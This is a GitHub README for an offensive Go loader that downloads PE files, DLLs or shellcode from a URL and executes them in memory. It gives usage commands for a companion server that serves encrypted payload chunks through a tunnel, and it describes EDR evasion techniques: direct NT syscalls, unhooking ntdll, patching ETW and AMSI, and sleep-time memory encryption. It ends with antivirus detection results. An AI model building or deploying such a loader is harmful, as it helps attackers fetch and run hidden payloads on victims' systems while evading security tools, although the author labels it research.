# go-loader

a pe/dll/shellcode loader that downloads and executes files from urls in memory

## demo
![demo (2)](https://github.com/user-attachments/assets/587895f5-7d6c-4825-a4da-d61796546cbe)


## technical details

this project implements full reflective loading of pe files, dlls, and shellcode directly from downloaded byte arrays in memory without ever touching disk. the core functionality includes complete pe parsing with dos/nt header validation, section mapping with proper memory permissions (rx for .text, rw for data), base relocation processing for aslr compatibility supporting both 32-bit (image_rel_based_highlow) and 64-bit (image_rel_based_dir64) relocations, and comprehensive import address table resolution including forwarded export handling that can parse "dll.function" and "dll.#ordinal" forwarder strings and resolve them across multiple dlls. the main technical challenge was go's absolutely evil garbage collector that would intermittently move or collect our downloaded buffers during pe/dll execution, causing status_invalid_handle (0xc0000008) errors and crashes. i solved this by implementing very aggressive anti-gc techniques: runtime.keepalive calls throughout execution, completely disabling gc during critical sections with debug.setgcpercent(-1), locking goroutines to os threads with runtime.lockosthread, forcing multiple gc runs before execution to clear memory, and creating dedicated pinned byte copies that stay alive throughout the entire loading process. for pe execution we allocate memory at the preferred base address when possible or use relocations when aslr forces us elsewhere, copy headers and sections correctly, fix imports and relocations, then execute via ntcreatethreadex. for dll loading we parse export tables to find functions by name or ordinal, handle complex import resolution, and can execute specific exported functions or the dll entry point. shellcode execution uses direct ntinjectselfshellcode for self-injection. the network downloader includes proper http headers for opsec and handles the downloaded data with gc-safe buffer management. all critical syscalls now go through custom nt api wrappers (ntallocatevirtualmemory, ntwritevirtualmemory, ntreadvirtualmemory, ntprotectvirtualmemory, ntfreevirtualmemory, ntunmapviewofsection, ntcreatethreadex, ntwaitforsingleobject, ntclose, ntinjectselfshellcode) instead of high-level windows apis for better opsec and edr evasion. the loader now implements ekko sleep functionality for evasive sleeping during execution - this technique suspends all threads in the current process except the main thread, encrypts the entire process image in memory using systemfunction032 (rc4), sleeps for a specified duration, then decrypts the image and resumes all threads, making static memory analysis much more difficult during sleep periods. you can also encrypt the global buffer containing the downloaded pe/dll/shellcode easily with GetGlobalBufferRegion(), see main.go for example. the syscall wrappers (now in plan9 instead of nasm) provide direct nt api access after unhooking ntdll and applying patches to bypass userland hooks, though i still had to use syscall.loadlibrary and a LOT of syscalls in ekko implementation, also a few times for import resolution since you can't avoid loading dependencies and my ldrloaddll wrapper sucks sorry guys. the loader also now offers a server that parses a payload from disk, chunks, encrypts, and sends one by one to requesting client to be reflectively loaded and executed

> ekko implementation causes intermittent segfaults during dll loading, likely due to rop chain complexity + golang.

## to use the loader/server
```bash
## navigate to go-server/cmd
cd go-server/cmd
## in another shell, run the tcp tunnel ssh command included as a comment in server.go
## replace the const link with the generated link
## then run the server
go run server.go
## this will generate a payloads folder, move your payloads into them
## now navigate to go-loader/cmd\
cd ../cmd
go build -ldflags="-w -s" -trimpath -o loader.exe
## then to run with a payload from /payloads
./loader.exe -pe|dll|shellcode -url http://<generated-link>/payloads/filename.exe
```

## use this pattern for a more reliable form of evasion

```go
// import pkg/net and pkg/patch
patch.ETW
patch.AMSI
addr, size, err := net.GetGlobalBufferRegion()
if err != nil {
	log.Fatalf("[ERROR] Failed to get global buffer region: %v\n", err)
}

key, err := ekko.GenerateKey(16)
if err != nil {
	log.Fatalf("[ERROR] Failed to generate key: %v\n", err)
}

err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
if err != nil {
	log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
}

// we just call it again to decrypt bc symmetric 
err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
if err != nil {
	log.Fatalf("[ERROR] Failed to decrypt memory region: %v\n", err)
}

```
>unstable branch offers loading of dlls both reflectively and to help the PE loader resolve imports without importing or using syscall
>i stole go's amstdcall plan9 asm and used it as wincall :)
>unstable also removed ekko sleep, it just .. doesnt work with the new changes
>also changed chunk count of server, but you can update that according to your needs

## unstable detection 7/21/2025
https://www.virustotal.com/gui/file/c33b9c802da27d5383d58c3512e53679740acd9531424260c19aba5cc269fc7d
<img width="1216" height="871" alt="image" src="https://github.com/user-attachments/assets/f6e7a374-a10b-40b7-b003-49776a1b9b96" />


## stable detection 7/21/2025
https://www.virustotal.com/gui/file/c694af1f432187bab7078f32b40a49f9c6fa8557bb6739476f7426c42ab4a9fe/behavior
<img width="1204" height="865" alt="image" src="https://github.com/user-attachments/assets/b27ecd4e-2f5f-4c08-aa31-d4d0c223acc1" />

>yes this is now burnt, no I do not care, you shouldn't be using them for cybercrime anyways, research is more fun!



## credits

- [@timwhitez/Doge-MemX](https://github.com/timwhitez/Doge-MemX) for pe loader code that i adapted
- [@scriptchildie/goDLLrefletiveloader](https://github.com/scriptchildie/goDLLrefletiveloader) for dll loading code that i fixed forwarded functions and some other small issues
- [@scriptchildie/goEkko](https://github.com/scriptchildie/goEkko) for ekko sleep implementation
